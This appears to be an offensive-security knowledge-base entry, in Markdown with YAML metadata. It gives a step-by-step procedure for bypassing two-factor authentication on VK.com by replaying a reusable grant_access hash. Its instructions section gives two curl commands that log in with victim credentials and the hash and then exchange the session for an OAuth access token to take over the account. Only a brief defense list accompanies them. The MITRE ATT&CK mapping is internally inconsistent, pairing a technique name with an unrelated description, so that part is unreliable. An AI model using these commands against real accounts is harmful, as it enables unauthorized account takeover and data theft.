---
id: proc-vk-bypass-2fa-316078
tags:
  - 2fa-bypass
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-grant-access-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Domain Controller Authentication]]'
updated_at: '2025-12-14T17:24:47.571Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Domain Controller Authentication]]'
---
# Bypass 2FA with Reusable Hash

## Summary

This procedure uses a previously generated unbound hash from VK.com's grant_access endpoint to authenticate without entering a 2FA code, leading to full account access or token retrieval.

## Description

Once a reusable hash is obtained, it can be submitted in login requests to skip 2FA verification due to the lack of binding to account security states. This targets the web login system and assumes the attacker has the hash from prior endpoint interaction. Outcomes include unauthorized logins and potential data exfiltration or takeover.

## Requirements

1. Captured reusable hash from grant_access endpoint
2. Victim's login credentials or session context
3. HTTP client capable of POST requests

## Defense

Defensive measures and detection strategies:

- Bind auth hashes to 2FA status and session timestamps
- Log and alert on login attempts bypassing 2FA
- Use device fingerprinting to detect anomalous access

## Objectives

1. Submit the hash to bypass 2FA prompt
2. Obtain session cookies or access tokens
3. Achieve persistent account access

## Instructions

### Step 1: Submit Hash in Login Request

**Context**: Integrate the hash into a standard login flow to trigger bypass.

**Command** ([[commands/curl-grant-access-request]]):
```bash
curl -X POST "https://login.vk.com/?act=login" -d "email=victim@email.com&pass=victim_pass&grant_hash=reusable_hash&from_host=login.vk.com" -H "Cookie: remixed=1" -v
```

> This POST mimics a login with the hash parameter. Expected output: Successful authentication response without 2FA challenge, including session cookies.

### Step 2: Retrieve Access Token

**Context**: Use the bypassed session to fetch an access token for API access.

**Command** ([[commands/curl-grant-access-request]]):
```bash
curl -X GET "https://oauth.vk.com/access_token?client_id=app_id&client_secret=secret&grant_type=grant_access&code=auth_code_from_session&redirect_uri=login.vk.com" -H "Cookie: session_from_bypass" -v
```

> Leverage the session to exchange for a token. Expected output: JSON with access_token field, confirming takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Domain Controller Authentication]] Domain Policy Modification: Group Policy Modification

### Sub-Techniques


## Commands Used

- [[commands/curl-grant-access-request]]

## Tools Used


## Tags

- [[2fa-bypass]]
- [[account-takeover]]
